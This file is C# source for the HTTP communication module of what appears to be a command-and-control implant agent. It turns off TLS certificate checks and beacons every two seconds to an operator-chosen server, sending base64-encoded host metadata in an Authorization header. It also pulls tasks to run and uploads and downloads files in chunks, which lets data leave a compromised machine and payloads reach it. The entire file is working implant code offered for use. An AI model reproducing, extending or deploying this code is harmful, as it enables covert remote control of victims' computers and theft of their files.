using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }

        private CancellationTokenSource _tokenSource;

        private HttpClient _client;

        public HttpCommModule(string connectAddress, int connectPort)
        {
            ConnectAddress=connectAddress;
            ConnectPort=connectPort;

            ServicePointManager.ServerCertificateValidationCallback = new
            RemoteCertificateValidationCallback
            (
               delegate { return true; }
            );
        }


        public override void Init(AgentMetadata metadata)
        {
            base.Init(metadata);

            _client = new HttpClient();
            _client.Timeout = new TimeSpan(0, 0, 10);
            _client.BaseAddress = new Uri($"https://{this.ConnectAddress}:{this.ConnectPort}");
            _client.DefaultRequestHeaders.Clear();

            var encodedMetadata = Convert.ToBase64String(metadata.Serialize());
            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");

        }


        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    if (!_outBound.IsEmpty)
                    {
                        await PostData();
                    }
                    else
                        await this.CheckIn();
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }

                await Task.Delay(2000);
            }
        }

        private async Task CheckIn()
        {
            var response = await _client.GetByteArrayAsync("/");
            HandleResponse(response);
        }

        private async Task PostData()
        {
            var outbound = GetOutbound().ToArray().Serialize();
            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();
            this.HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<AgentTask[]>();
            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                    this._inbound.Enqueue(task);
            }
        }

        public override void Stop()
        {
            _tokenSource.Cancel();
        }

        private async Task<FileDescriptor> SetupDownload(string filename)
        {
            var response = await _client.GetByteArrayAsync($"/SetupDownload?filename={filename}");
            //var json = Encoding.UTF8.GetString(response);
            return response.Deserialize<FileDescriptor>();
        }

        private async Task<FileChunk> GetFileChunk(string id, int chunckIndex)
        {
            var response = await _client.GetByteArrayAsync($"/DownloadChunk?id={id}&index={chunckIndex}");
            return response.Deserialize<FileChunk>();
        }

        private async Task SetupUpload(FileDescriptor fileDesc)
        {
            var content = new StringContent(Encoding.UTF8.GetString(fileDesc.Serialize()), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("/SetupUpload", content);
            if (!response.IsSuccessStatusCode)
                throw new Exception($"{response}");
        }

        private async Task PostFileChunk(FileChunk chunk)
        {
            var content = new StringContent(Encoding.UTF8.GetString(chunk.Serialize()), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("/UploadChunk", content);
            if (!response.IsSuccessStatusCode)
                throw new Exception($"{response}");
        }


        public override async Task<Byte[]> Download(string filename, Action<int> OnCompletionChanged = null)
        {
            var desc = await this.SetupDownload(filename);
            var chunks = new List<FileChunk>();

            for (int index = 0; index < desc.ChunkCount; ++index)
            {
                var chunk = this.GetFileChunk(desc.Id, index).Result;
                chunks.Add(chunk);
                OnCompletionChanged?.Invoke(index * 100 / desc.ChunkCount);
            }

            using (var ms = new MemoryStream())
            {
                foreach (var chunk in chunks.OrderBy(c => c.Index))
                {
                    var bytes = Convert.FromBase64String(chunk.Data);
                    ms.Write(bytes, 0, bytes.Length);
                }

                return ms.ToArray();

            }
        }

        public const int ChunkSize = 10000;

        public override async Task Upload(byte[] fileBytes, string filename, Action<int> OnCompletionChanged = null)
        {

            var desc = new FileDescriptor()
            {
                Length = fileBytes.Length,
                ChunkSize = ChunkSize,
                Id = Guid.NewGuid().ToString(),
                Name = filename
            };

            var chunks = new List<FileChunk>();

            int index = 0;
            using (var ms = new MemoryStream(fileBytes))
            {

                var buffer = new byte[ChunkSize];
                int numBytesToRead = (int)ms.Length;

                while (numBytesToRead > 0)
                {

                    int n = ms.Read(buffer, 0, ChunkSize);
                    //var data =
                    var chunk = new FileChunk()
                    {
                        FileId = desc.Id,
                        Data = System.Convert.ToBase64String(buffer.Take(n).ToArray()),
                        Index = index,
                    };
                    chunks.Add(chunk);
                    numBytesToRead -= n;

                    index++;
                }
            }

            desc.ChunkCount = chunks.Count;

            await SetupUpload(desc);

            index = 0;
            foreach (var chunk in chunks)
            {
                await PostFileChunk(chunk);
                OnCompletionChanged?.Invoke(index * 100 / desc.ChunkCount);
                index++;
            }
        }

    }
}
